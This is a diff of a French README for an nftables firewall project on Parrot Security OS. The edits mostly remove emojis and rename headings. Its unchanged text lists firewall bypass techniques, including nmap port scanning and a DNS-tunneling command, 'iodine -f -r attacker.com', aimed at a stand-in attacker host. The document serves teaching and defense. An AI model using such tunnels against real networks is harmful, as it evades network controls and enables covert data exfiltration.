@@ -1,4 +1,4 @@
-## Objectif du projet
+## Projet Firewall — Parrot OS
 
 Ce projet présente la configuration de pare-feux avancés sous **Parrot Security OS**, une distribution orientée **pentest** et **protection de la vie privée/anonymat**.
 
@@ -27,15 +27,15 @@ Les démonstrations portent sur les niveaux suivants :
 - **Niveau 6** → protège spécifiquement ta machine personnelle.
 - **Niveau 7** → transforme ta machine en pare-feu et routeur pour un réseau virtuel.
 
-📸 Exemple de capture d’écran (nftables actif en niveau 6) :
+ Exemple de capture d’écran (nftables actif en niveau 6) :
 ![Capture d’écran Niveau 6](images/niveau6.png)
 
-📸 Exemple de capture d’écran (nftables NAT/routeur niveau 7) :
+ Exemple de capture d’écran (nftables NAT/routeur niveau 7) :
 ![Capture d’écran Niveau 7](images/niveau7.png)
 
 ---
 
-# 🖥️ Démonstrations
+#  Démonstrations
 
 ➡️ **Application des règles** :
 
@@ -66,10 +66,10 @@ Même avec un firewall avancé (niveaux 6 et 7), il existe des **techniques de c
 - 🔓 **Exploiter les ports ouverts**
 (ex : `nmap -p 443 <cible>` ➝ scanner en HTTPS).
 
-- 🌐 **Tunneling DNS**
+-  **Tunneling DNS**
 (ex : `iodine` ➝ transformer DNS en canal de communication).
 
-- 🐞 **Exploiter des failles applicatives** derrière un port autorisé.
+-  **Exploiter des failles applicatives** derrière un port autorisé.
 
 ---
 
@@ -86,7 +86,7 @@ iodine -f -r attacker.com
 
 ---
 
-# 🔑 Différence entre Niveau 6 et Niveau 7
+#  Différence entre Niveau 6 et Niveau 7
 
 ### 🔹 Niveau 6 : Pare-feu personnel
 - Protège uniquement **ta machine locale**.
@@ -108,15 +108,15 @@ Parrot OS est une alternative solide à Kali Linux : plus légère, orientée vi
 
 Les niveaux 6 et 7 démontrent deux cas concrets :
 
-🔒 **Protection avancée d’une machine individuelle** (standalone).
-🌐 **Mise en place d’un routeur/firewall complet** pour un lab réseau.
+**Protection avancée d’une machine individuelle** (standalone) 
+**Mise en place d’un routeur/firewall complet** pour un lab réseau.
 
 👉 Ce projet illustre comment un firewall peut évoluer :
 d’une **simple protection locale** ➝ vers un **composant réseau avancé**.
 
 ---
 
-# 🛠️ Technologies utilisées
+#  Technologies utilisées
 
 - Parrot OS
 - nftables
